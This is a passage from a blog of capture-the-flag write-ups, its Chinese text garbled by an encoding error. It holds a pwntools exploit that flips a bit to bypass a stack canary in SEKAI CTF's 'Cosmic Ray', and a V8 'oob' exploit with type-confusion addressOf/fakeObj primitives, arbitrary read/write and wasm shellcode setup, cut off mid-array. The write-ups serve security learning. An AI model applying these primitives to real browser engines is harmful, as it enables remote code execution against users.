<h2 id="Cosmic-Ray"><a href="#Cosmic-Ray" class="headerlink" title="Cosmic Ray"></a>Cosmic Ray</h2><p><img src="/2023/08/29/SEKAI-CTF-2023-Writeup/checksec.png"></p>
<p>ç”¨ IDA æ‰“é–‹å¾Œç™¼ç¾æœ‰ buffer overflowï¼Œä½†æœ‰é–‹ canaryï¼Œæ‰€ä»¥è¦æƒ³è¾¦æ³• leak æˆ–è®“å®ƒå£æ‰<br>æœ‰çµ¦ä¸€å€‹ win()ï¼Œæœƒç›´æ¥è¼¸å‡º flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 addr; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v8 = v3;</span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf_0(_bss_start, <span class="number">0LL</span>, envp);</span><br><span class="line">  puts_0(<span class="string">&quot;Welcome to my revolutionary new cosmic ray machine!&quot;</span>);</span><br><span class="line">  puts_0(<span class="string">&quot;Give me any address in memory and I&#x27;ll send a cosmic ray through it:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;0x%lx&quot;</span>, &amp;addr);</span><br><span class="line">  getchar_0(<span class="string">&quot;0x%lx&quot;</span>, &amp;addr);</span><br><span class="line">  cosmic_ray((__int64)&amp;v8, addr);</span><br><span class="line">  puts_0(<span class="string">&quot;Please write a review of your experience today:&quot;</span>);</span><br><span class="line">  gets_0(&amp;v6);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿé€²å» cosmic_ray()ï¼Œç™¼ç¾å®ƒæœƒæŠŠæˆ‘å€‘çµ¦çš„ address è£¡çš„è³‡æ–™å–å‡ºä¾†ï¼Œå¯ä»¥é¸æ“‡ç¿»è½‰å…¶ä¸­ 1 bit å†æŠŠè³‡æ–™å¯«å›å»</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __usercall cosmic_ray@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;, __int64 addr@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp-34h] [rbp-34h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp-2Ch] [rbp-2Ch]</span></span><br><span class="line">  _BYTE *bin_arr; <span class="comment">// [rsp-28h] [rbp-28h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  __int16 v9; <span class="comment">// [rsp-12h] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v11 = a1;</span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v6 = open_0(<span class="string">&quot;/proc/self/mem&quot;</span>, <span class="number">2LL</span>);</span><br><span class="line">  lseek_0(v6, addr, <span class="number">0LL</span>);</span><br><span class="line">  read_0(v6, &amp;v9, <span class="number">1LL</span>);</span><br><span class="line">  bin_arr = get_bin(v9);</span><br><span class="line">  puts_0(<span class="string">&quot;\n|0|1|2|3|4|5|6|7|&quot;</span>);</span><br><span class="line">  printf_0();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)bin_arr[i];</span><br><span class="line">    printf_0();</span><br><span class="line">  &#125;</span><br><span class="line">  puts_0(<span class="string">&quot;\n\nEnter a bit position to flip (0-7):&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  getchar_0(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">7</span> )</span><br><span class="line">    exit_0(<span class="number">1LL</span>);</span><br><span class="line">  v8 = flip_bit((__int64)bin_arr, idx);</span><br><span class="line">  HIBYTE(v9) = binary_to_byte((__int64)&amp;v11, v8);</span><br><span class="line">  printf_0();</span><br><span class="line">  lseek_0(v6, addr, <span class="number">0LL</span>);</span><br><span class="line">  write_0();</span><br><span class="line">  <span class="keyword">return</span> v10 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹äº† flit_bit() èˆ‡ binary_to_byte() éƒ½æ²’ç™¼ç¾æ¼æ´ï¼Œå¾Œé¢ä¹Ÿæ²’æœ‰ç™¼ç¾å¯ä»¥åš leak çš„åœ°æ–¹<br>ç”±æ–¼å®ƒæ˜¯ Partial RELRO çš„é—œä¿‚ï¼Œæœ‰æƒ³åˆ°é€é GOT Hijacking ä¾†æŠŠ puts() gets() __stack_check_fail() å…¶ä¸­ä¸€å€‹çš„ GOT å¯«æˆ win()ï¼Œä½†ç”¨ gdb çœ‹ä¸€ä¸‹ç™¼ç¾åœ°å€å·®å¾—æœ‰é»å¤šï¼Œç„¡æ³•åªé€éç¿» 1 bit ä¾†æ”¹æˆ win()</p>
<p>å›å»çœ‹ cosmic_ray() ç™¼ç¾å®ƒæ˜¯é€éè®€å¯« &#x2F;proc&#x2F;self&#x2F;mem ä¾†å®Œæˆæ“ä½œçš„ï¼Œä¹‹å‰æ‰“ Google CTF 2023 æ™‚æœ‰é‡åˆ°ä¸€é¡Œ write-flag-where ä¹Ÿæ˜¯é¡ä¼¼çš„ä½œæ³•ï¼Œç”±æ–¼è®€å¯« &#x2F;proc&#x2F;self&#x2F;mem å¯ä»¥ç„¡è¦– pages çš„æ¬Šé™ï¼Œæ‰€ä»¥å¯ä»¥æ›´æ”¹ .text æ®µçš„å…§å®¹ã€‚</p>
<p>é€™é‚Šå¯ä»¥å°‡ jz(opcode &#x3D; 0x74) å¯«æˆ jnz(opcode &#x3D; 0x75)ï¼Œä½¿ç¨‹å¼ä¸å‘¼å« __stack_check_fail() ä¾†é€šéæª¢æŸ¥</p>
<p><img src="/2023/08/29/SEKAI-CTF-2023-Writeup/IDA.png"></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chals.sekai.team&#x27;</span>, <span class="number">4077</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./cosmicray&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./cosmicray&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = elf.symbols[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x74 -&gt; 0x75</span></span><br><span class="line"><span class="comment">#jz -&gt; jnz</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(<span class="number">0x4016f4</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/29/SEKAI-CTF-2023-Writeup/flag.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/13/starctf-oob/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/13/starctf-oob/" class="post-title-link" itemprop="url">starctf oob writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-07-13 19:07:54" itemprop="dateCreated datePublished" datetime="2023-07-13T19:07:54+08:00">2023-07-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-09-08 19:23:17" itemprop="dateModified" datetime="2025-09-08T19:23:17+08:00">2025-09-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ç’°å¢ƒæ­å»º"><a href="#ç’°å¢ƒæ­å»º" class="headerlink" title="ç’°å¢ƒæ­å»º"></a>ç’°å¢ƒæ­å»º</h2><p>é€™é‚Šä½¿ç”¨Ubuntu 18.04</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">git checkout</span><br><span class="line">git apply oob.diff</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure>

<h2 id="patch-åˆ†æ"><a href="#patch-åˆ†æ" class="headerlink" title="patch åˆ†æ"></a>patch åˆ†æ</h2><p>çµ¦ array æ–°å¢äº†ä¸€å€‹ oob() methodï¼Œå¯ä»¥åšåˆ°ä¸€å€‹ index ç¯„åœçš„è¶Šç•Œè®€å¯«</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>é€™ç‰ˆæœ¬çš„ v8 æ²’æœ‰ä½¿ç”¨ pointer compressionï¼Œæ‰€ä»¥ä¸€äº›åç§»é‡æœƒè·Ÿç¾åœ¨çš„ v8 ä¸åŒ</p>
<h4 id="addressOf-fakeObj-primitive"><a href="#addressOf-fakeObj-primitive" class="headerlink" title="addressOf &amp; fakeObj primitive"></a>addressOf &amp; fakeObj primitive</h4><p>å¯ä»¥åˆ©ç”¨ oob() è®€å¯« mapï¼Œé€ æˆ type confusion<br>å®šç¾©å¹¾å€‹å‡½æ•¸å¯¦ç¾å‹æ…‹è½‰æ›ï¼Œä¸¦åˆ©ç”¨ type confusion æ’°å¯« addressOf èˆ‡ fakeObj primitive</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// type convert</span></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">BigUint64</span> = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	float64[<span class="number">0</span>] = value;</span><br><span class="line">	<span class="keyword">return</span> <span class="title class_">BigUint64</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="title class_">BigUint64</span>[<span class="number">0</span>] = value;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + value.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type confusion</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_arr = [obj];</span><br><span class="line"><span class="keyword">var</span> float64_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr_map = obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> float64_arr_map = float64_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">target</span>)&#123;</span><br><span class="line">	obj_arr[<span class="number">0</span>] = target;</span><br><span class="line">	obj_arr.<span class="title function_">oob</span>(float64_arr_map);</span><br><span class="line">	<span class="keyword">let</span> addr = <span class="title function_">ftoi</span>(obj_arr[<span class="number">0</span>]);</span><br><span class="line">	obj_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	float64_arr[<span class="number">0</span>] = <span class="title function_">itof</span>(addr);</span><br><span class="line">	float64_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line">	<span class="keyword">let</span> ret_obj = float64_arr[<span class="number">0</span>];</span><br><span class="line">	float64_arr.<span class="title function_">oob</span>(float64_arr_map);</span><br><span class="line">	<span class="keyword">return</span> ret_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="arbitrary-read-write-primitive"><a href="#arbitrary-read-write-primitive" class="headerlink" title="arbitrary read &amp; write primitive"></a>arbitrary read &amp; write primitive</h3><p>é€é fakeObj() åœ¨ arb_rw_tools - 0x20 å½é€  fake_obj<br>ç”±æ–¼ array å…§å®¹å¯æ§ï¼Œä¸” arb_rw_tools[2] çš„ address å’Œ fake_obj æ“ºæ”¾ elements pointer çš„ address ç›¸åŒï¼Œå¯ä»¥ä¿®æ”¹ arb_rw_tools[2] é€²è¡Œä»»æ„è®€å¯«</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(addr % <span class="number">2n</span> == <span class="number">0</span>)addr += <span class="number">1n</span>;</span><br><span class="line">	<span class="keyword">let</span> fake_obj = <span class="title function_">fakeObj</span>(arb_tools_addr - <span class="number">0x20n</span>);</span><br><span class="line">	arb_rw_tools[<span class="number">2</span>] = <span class="title function_">itof</span>(addr - <span class="number">0x10n</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">ftoi</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr, value</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(addr % <span class="number">2n</span> == <span class="number">0</span>)addr += <span class="number">1n</span>;</span><br><span class="line">	<span class="keyword">let</span> fake_obj = <span class="title function_">fakeObj</span>(arb_tools_addr - <span class="number">0x20n</span>);</span><br><span class="line">	arb_rw_tools[<span class="number">2</span>] = <span class="title function_">itof</span>(addr - <span class="number">0x10n</span>);</span><br><span class="line">	fake_obj[<span class="number">0</span>] = <span class="title function_">itof</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨ wasm å¯«å…¥ shellcode<br>f-&gt;shared_info-&gt;data-&gt;instance+0x88 å­˜æ”¾è‘— rwx page çš„ addressï¼Œé€é gdb æ‰¾å‡º offset è¨ˆç®— addressï¼Œå¾€è©²åœ°å€å¯«å…¥ shellcode å³å¯</p>
<p>åœ¨å˜—è©¦çš„éç¨‹ä¸­ç™¼ç¾ç›´æ¥ä½¿ç”¨ write64() å¯«å…¥æœƒå¤±æ•—ï¼Œä¸€äº› writeup æåˆ°å¤±æ•—çš„åŸå› èˆ‡ float array è™•ç† float çš„æ–¹å¼æœ‰é—œï¼Œæœ€å¾Œä½¿ç”¨ dataView çš„æ–¹å¼å®Œæˆå¯«å…¥ shellcode</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span 